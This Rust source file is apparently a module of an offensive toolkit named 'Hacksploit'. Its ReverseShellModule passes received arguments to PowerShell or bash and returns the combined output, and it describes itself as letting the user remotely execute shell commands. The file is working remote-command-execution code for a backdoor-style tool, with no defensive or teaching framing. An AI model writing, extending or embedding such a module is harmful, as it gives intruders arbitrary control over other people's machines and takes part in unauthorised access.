use std::io::Error;
use std::process::{Command, Output, Stdio};

use crate::HacksploitModule;

const ERROR_MESSAGE: &str = "yeah so there's an error\n";

pub struct ReverseShellModule {
    name: String,
}

impl ReverseShellModule {
    pub fn new() -> Self {
        ReverseShellModule {
            name: String::from("shell"),
        }
    }
}

#[cfg(target_os = "windows")]
fn generate_output(cmd: String) -> Result<Output, Error> {
    Command::new("powershell")
        .arg(cmd)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
}

#[cfg(not(target_os = "windows"))]
fn generate_output(cmd: String) -> Result<Output, Error> {
    Command::new("/bin/bash")
        .arg("-c")
        .arg(cmd)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
}

impl HacksploitModule for ReverseShellModule {
    fn on_command(&self, args: Vec<&str>) -> String {
        let output = generate_output(args.join(" "));
        match output {
            Ok(mut output) => {
                let mut stdout = output.stdout;
                stdout.append(&mut output.stderr);
                match String::from_utf8(stdout) {
                    Ok(response) => {
                        return response;
                    }
                    Err(_) => return String::from(ERROR_MESSAGE),
                }
            }
            Err(_) => return String::from(ERROR_MESSAGE),
        }
    }
    fn get_name(&self) -> String {
        self.name.clone()
    }

    fn get_description(&self) -> String {
        String::from("Allows you to remotely execute shell commands. Usage: \"shell <command>\"")
    }
}
